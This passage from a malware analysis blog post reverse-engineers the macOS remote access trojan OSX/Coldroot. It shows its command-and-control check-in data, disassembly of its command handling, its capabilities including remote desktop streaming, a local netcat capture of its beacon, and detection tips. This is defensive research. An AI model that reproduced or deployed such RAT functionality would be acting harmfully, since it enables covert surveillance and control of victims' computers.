  0x03b2d1cc: "{"Ver":1,"RAM":0,"CAM":false,"Serial":"x86_64\n","PCName":
  "user\n - user","OS":"Mac OS X10.13.2","ID":"Mac_Vic","AW":"N\/A","AV":"N\/A"}"</pre>
  </span> 
  </div>
  <br>
  Note that the malware actually prints this out to <span class="n3rdFont">stdout</span> as well:

  <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  (lldb) c

  JSON Packet : {"Ver":1,"RAM":0,"CAM":false,"Serial":"x86_64\n","PCName":
   "user\n - user","OS":"Mac OS X10.13.2","ID":"Mac_Vic","AW":"N\/A","AV":"N\/A"}

  PC info sent ..</pre>
</span>
</div>
<br>

If we allow the malware to continue, we can also capture this same data in a network monitoring tools such as WireShark:
<br><br>
    <span><img src="../images/blog/blog_0x2A/wireshark.png" style="display:block; margin:auto;"/></span>
<br>
You might be wondering why in the survey data sent to the command &amp; control server, <span class="n3rdFont">'Serial'</span> is set to <span class="n3rdFont">x86_64</span> or why the<span class="n3rdFont">'RAM'</span> is set to 0. 
<br>
<br>
Well to generate the value for 'Serial', the malware executes <span class="n3rdFont">uname</span> with the <span class="n3rdFont">-m</span> flag...which return the architecture of the system (not the serial, which could be retrieved via something like: <span class="n3rdFont">ioreg -l | grep IOPlatformSerialNumber</span>). For determining the amount of RAM, the malware invokes a function called <span class="n3rdFont">'GETRAMSIZEALL'</span>...this simply returns 0:

<div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
  int _OSFUNCTIONS_$$_<b>GETRAMSIZEALL</b>$$INT64() 
  {
    return 0x0;
  }</pre>
  </span>
</div>  
<br>
Once <span class="n3rdFont">OSX/Coldroot</span> has checked in, it will process any tasking returned from the command &amp; control server. The logic for this is implemented in the <span class="n3rdFont">_NEWCONNECTIONS_$$_PROCESSPACKET$TIDTCPCLIENT$TIDBYTES</span> function. This function parses out the command from the command &amp; control server, and then processes (acts upon) it. 
<br>
<br>
In disassembled code, this looks like the following:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
  __text:000691F7    call    _CONNECTIONFUNC_$$_BYTEARRAYTOMAINPACKET$TIDBYTES$$TMAINPACKET
  __text:000691FC    mov     eax, [ebp+command]
  __text:000691FF    test    eax, eax
  __text:00069201    jl      loc_6986B
  __text:00069207    test    eax, eax
  __text:00069209    jz      loc_692C9
  __text:0006920F    sub     eax, 2
  __text:00069212    jz      loc_692D9
  __text:00069218    sub     eax, 1
  __text:0006921B    jz      loc_6935E
  __text:00069221    sub     eax, 2
  __text:00069224    jz      loc_69374
  __text:0006922A    sub     eax, 1
  __text:0006922D    jz      loc_693EC
  __text:00069233    sub     eax, 1
  __text:00069236    jz      loc_694AA
  __text:0006923C    sub     eax, 2
  __text:0006923F    jz      loc_695A2
  ...</pre>
  </span>
</div>  
<br>
Via static analysis, we can determine what commands are supported by the malware. Let's look at an example of this. 
<br>
<br>
When the malware receives command #7 from the command &amp; control server, it executes the logic at <span class="n3rdFont">0x000694aa</span>. In the same block of code it contains the debug string <span class="n3rdFont">"Delete File : "</span>, a call to function named <span class="n3rdFont">'DELETEFILEFOLDER'</span>, and other debug string, <span class="n3rdFont">"{{{{ Delete OK Lets test }}}}"</span>:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
  __text:000694DA    lea     edx, (aDeleteFile - 6914Bh)[ebx] ; "Delete File : "
  __text:000694E0    lea     eax, [ebp+var_D8]
  __text:000694E6    call    fpc_unicodestr_concat
  __text:000694EB    mov     eax, [ebp+var_D8]
  __text:000694F1    call    _DEBUGUNIT_$$_WRITELOG$UNICODESTRING

  __text:00069504    mov     eax, [ebp+var_A4]
  __text:0006950A    call    _FILESFUNC_$$_DELETEFILEFOLDER$UNICODESTRING$$BOOLEAN

  __text:00069548    lea     eax, (aDeleteOkLetsTe - 6914Bh)[ebx] ; "{{{ Delete OK Lets test }}}"
  __text:0006954E    call    _DEBUGUNIT_$$_WRITELOG$UNICODESTRING</pre>
  </span>
</div> 
<br>
Probably safe to guess command #7 is the delete file (or directory) command! But let's confirm. 
<br>
<br>
The <span class="n3rdFont">'DELETEFILEFOLDER'</span> function calls  <span class="n3rdFont">_LAZFILEUTILS_$$_DELETEFILEUTF8$ANSISTRING$$BOOLEAN</span> which in turn calls <span class="n3rdFont">_SYSUTILS_$$_DELETEFILE$RAWBYTESTRING$$BOOLEAN</span> which finally calls <span class="n3rdFont">unlink</span> (the system call to delete a file or directory).
<br>
<br>
Repeating this process for the other commands reveals the following capabilities: 

<ul style="list-style-type:square">
<li>file/directory list</li><br>
<li>file/directory rename</li><br>
<li>file/directory delete</li><br>
<li>process list</li><br>
<li>process execute</li><br>
<li>process kill</li><br>
<li>download</li><br>
<li>upload</li><br>
<li>get active window</li><br>
<li>remote desktop</li><br>
<li>shutdown</li><br>
</ul>
All are self-explanatory and implemented in fairly standard ways (i.e. delete file calls <span class="n3rdFont">unlink</span>), save perhaps for the remote desktop command. 
<br>
<br>
When the malware receives a command from the server to start a remote desktop session, it spawns a new thread named: <span class="n3rdFont">'REMOTEDESKTOPTHREAD'</span>. This basically sits in a while loop (until the 'stop remote desktop' command is issued), taking and 'streaming' screen captures of the user's desktop to the remote attacker:

<div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
 while ( /* should capture */ ) {
 ...
    _REMOTEDESKTOP_$$_GETSHOT$LONGINT$LONGINT$WORD$WORD$$TIDBYTES(...);
    
    _CONNECTIONFUNC_$$_CLIENTSENDBUFFER$TIDTCPCLIENT$TIDBYTES$$BOOLEAN();

    _CLASSES$_$TTHREAD_$__$$_SLEEP$LONGWORD();
  }</pre>
  </span>
</div>
<br>
It should be noted that if no command or tasking is received from the command &amp; control server, the malware will simply continue beaconing...interestingly, sending the name of the user's active window in each heartbeat:

<div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
<span class="n3rdFont"><pre>
$ cat /private/var/tmp/com.apple.audio.driver.app/Contents/MacOS/conx.wol 
{"PO":<b>1337</b>,"HO":<b>"127.0.0.1"</b>,"MU":"CRHHrHQuw JOlybkgerD","VN":"Mac_Vic",
 "LN":"adobe_logs.log","KL":true,"RN":true,"PN":"com.apple.audio.driver"}

<span style="color:white">//local listener
// note: non-printable characters removed</span>
$ nc -l 1337
{"Ver":1,"RAM":0,"CAM":false,"Serial":"x86_64\n","PCName":"user\n - user",
 "OS":"Mac OS X10.13.2","ID":"Mac_Vic","AW":"N\/A","AV":"N\/A"}

...
Calculator
Safari
Terminal</pre>
</span> 
</div>
<br>

Alright, that wraps up our reversing sessions of <span class="n3rdFont">OSX/Coldroot</span>. Let's now discuss some other interesting aspects of the malware, such as its author, source-code, and business model!
<br>
<br>
<span style="color: #95c02d; font-weight: bold;">Coldroot</span><br>
Once the technical analysis of the malware was complete, I began googling around on the search term: <span class="n3rdFont">Coldzer0</span>. Looking at the disassembly of <span class="n3rdFont">OSX/Coldroot</span> we can see this string embedded in the binary, purportedly identifying the author's handle:

<div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
 _NEWCONNECTIONS_$$_FINALIZY proc near
   push    ebp
   mov     ebp, esp
   lea     esp, [esp-8]
   mov     [ebp+var_4], ebx
   call    $+5
   pop     ebx
   lea     eax, (aCodedByColdzer - 6992Fh)[ebx] ; <b>"Coded By Coldzer0 / Skype:Coldzer01 "</b>
   call    _DEBUGUNIT_$$_WRITELOG$UNICODESTRING
   mov     ebx, [ebp+var_4]
   mov     esp, ebp
   pop     ebp
   retn</pre>
  </span>
</div> 

<br>
Besides revealing the likely identify of the malware author, this turns up:
<ul style="list-style-type:square">
<li><a class="inlineLink" href="https://github.com/xlinshan/Coldroot">source code</a> for an old (incomplete) version of <span class="n3rdFont">Coldroot</span></li><br>
<li>an informative <a class="inlineLink" href="../images/blog/blog_0x2A/coldroot.mp4">demo video</a> of the malware</li>
</ul>
The source code, though (as noted), is both old and incomplete - provides some confirmation of our analysis. For example, the <a class="inlineLink" href="https://github.com/xlinshan/Coldroot/blob/master/PacketTypes.pas">PacketTypes.pas</a> file contains information about the malware's protocol and tasking commands:
<br><br>
    <span><img src="../images/blog/blog_0x2A/src.png" style="display:block; margin:auto;"/></span>
<br>
The demo video is rather neat as it provides further insight into <span class="n3rdFont">Coldroot</span>, visually illustrating how an attacker can build (and customize) deployable agents:
<br><br>
      <span><img src="../images/blog/blog_0x2A/screencapt.png" style="display:block; margin:auto;"/></span>
<br>
...and also how they can be remotely interacted with, and tasked:
<br><br>
      <span><img src="../images/blog/blog_0x2A/screencapt1.png" style="display:block; margin:auto;"/></span>
<br>
The video also confirms the fact that <span class="n3rdFont">Coldroot</span> is indeed a fully cross-platform 'remote admin tool' (RAT):
<br><br>
      <span><img src="../images/blog/blog_0x2A/screencapt2.png" width="800" style="display:block; margin:auto;"/></span>
<br>
If you have some extra time on your hands, check the video, courtesy of <span class="n3rdFont">Coldzer0</span>:
<br>
<br>

<div style="text-align: center;">
<video controls="controls">
<source src="../images/blog/blog_0x2A/coldroot.mp4" type="video/mp4">
</video>
</div>

<br>
In terms of the (apparent) hacker's plans for the <span class="n3rdFont">Coldroot</span>, he stated in the comments both its release date (1/1/2017) and that fact that it would be for sale:
<br><br>
    <span><img src="../images/blog/blog_0x2A/comments.png" style="display:block; margin:auto;"/></span>
<br>

<br>
<br>
<span style="color: #95c02d; font-weight: bold;">Conclusions</span><br>
In this blog post we provided a comprehensive technical analysis of the macOS agent of the cross-platform RAT <span class="n3rdFont">OSX/Coldroot</span>. Thought not particularly sophisticated, it's rather 'feature complete' and currently undetected all AV-engines on VirusTotal. Moreover, it is a good illustrative example that hackers continue to target macOS!
<br>
<br>
And remember if you want to stay safe, running the latest version of macOS will definitely help! For one, (due to a bug in UPX?) the OS refuses to even run the malware:

<div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
    <span class="n3rdFont"><pre>
  $ lldb com.apple.audio.driver.app
  (lldb) r
  error: error: ::posix_spawnp ( pid => 1256, path = 'com.apple.audio.driver.app') 
                err = <b>Malformed Mach-o file</b> (0x00000058)</pre>
  </span> 
  </div>
  <br>
  Also, as mentioned Apple now protects <span class="n3rdFont">TCC.db</span> via SIP, so the system-wide keylogging capabilities of <span class="n3rdFont">OSX/Coldroot</span> should be mitigated. 
  <br>
  <br>
  Moreover, my free tools such as <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> and <a class="inlineLink" href="https://objective-see.com/products/lulu.html">LuLu</a> can generically thwart such threats :)
<br><br>
      <span><img src="../images/blog/blog_0x2A/bb.png" style="display:block; margin:auto;"/></span>
<br>
<br><br>
      <span><img src="../images/blog/blog_0x2A/lulu.png" style="display:block; margin:auto;"/></span>
<br>
And if you are worried that you are infected, look for an unsigned launch daemon running out of <span class="n3rdFont">/private/var/tmp/</span>. <a class="inlineLink" href="https://objective-see.com/products/knockknock.html">KnockKnock</a> can help with this task:
<br><br>
      <span><img src="../images/blog/blog_0x2A/kk.png" width="800" style="display:block; margin:auto;"/></span>
<br>

<br>
<br>
<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
	<span class="n3rdFont">
	love these blog posts &amp; tools? you can support them via <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a>! Mahalo :) 
	<br>
	</span>
	</div>
	<br>
	<br>
	</span>
	</div>
	</section>	
</div>		

<!-- footer, copyright notice and social media icons -->
<nav role="footer">
<ul>
	<li class="copyright">&copy; 2018 objective-see llc</li>
	<li><a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon ss-social">&#x2709;</span></a></li>
	<li><a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon ss-social">&#xF611;</span></a></li>
	<li><a href="../rss.xml" class="menubutton icon"><span class="ss-icon">&#xE310;</span></a></li>
	<li>
        <a href="https://www.patreon.com/bePatron?u=4857001" class="menubutton icon donate" style="font-size: 18px; padding-top: 14px;">donate!</a>
    </li>
</ul>
</nav>

</body>
</html>
